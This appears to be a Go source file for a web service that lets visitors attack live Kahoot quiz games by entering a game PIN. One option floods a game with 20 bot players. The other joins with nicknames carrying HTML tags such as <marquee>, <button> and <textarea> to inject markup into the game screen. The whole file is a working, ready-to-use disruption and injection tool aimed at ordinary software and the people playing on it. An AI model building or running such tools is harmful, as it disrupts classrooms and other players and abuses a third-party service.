package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"

	"github.com/unixpickle/kahoot-hack/kahoot"
)

var usageSemaphore = make(chan struct{}, 10)

func main() {
	if len(os.Args) != 2 {
		fmt.Fprintln(os.Stderr, "Usage: site <port>")
		os.Exit(1)
	}
	_, err := strconv.Atoi(os.Args[1])
	if err != nil {
		fmt.Fprintln(os.Stderr, "Invalid port number")
		os.Exit(1)
	}

	http.HandleFunc("/hack", handleHack)
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		path := strings.Replace(r.URL.Path, "/", "", -1)
		if path == "" {
			http.ServeFile(w, r, "assets/index.html")
		} else {
			http.ServeFile(w, r, "assets/"+path)
		}
	})

	http.ListenAndServe(":"+os.Args[1], nil)
}

func handleHack(w http.ResponseWriter, r *http.Request) {
	usageSemaphore <- struct{}{}
	defer func() {
		<-usageSemaphore
	}()

	if r.ParseForm() != nil {
		http.ServeFile(w, r, "assets/invalid_form.html")
		return
	}

	gamePin := strings.TrimSpace(r.PostFormValue("pin"))
	nickname := r.PostFormValue("nickname")
	hackType := r.PostFormValue("hack")

	var res bool
	if hackType == "Flood" {
		res = floodHack(gamePin, nickname)
	} else if hackType == "HTML Hack" {
		res = htmlHack(gamePin, nickname)
	} else {
		http.ServeFile(w, r, "assets/invalid_form.html")
		return
	}

	if res {
		http.Redirect(w, r, "/", http.StatusTemporaryRedirect)
	} else {
		http.ServeFile(w, r, "assets/unknown_game.html")
	}
}

func floodHack(gamePin string, nickname string) bool {
	log.Println("Flood hack:", gamePin, "with nickname", nickname)
	for i := 0; i < 20; i++ {
		conn, err := kahoot.NewConn(gamePin)
		if err != nil {
			return false
		}
		conn.Login(nickname + strconv.Itoa(i+1))
		defer conn.Close()
	}
	return true
}

func htmlHack(gamePin string, nickname string) bool {
	log.Println("HTML hack:", gamePin, "with nickname", nickname)
	for _, prefix := range []string{"<h1>", "<u>", "<h2>", "<marquee>", "<button>",
		"<input>", "<pre>", "<textarea>"} {
		conn, err := kahoot.NewConn(gamePin)
		if err != nil {
			return false
		}
		defer conn.Close()
		conn.Login(prefix + nickname)
	}
	return true
}
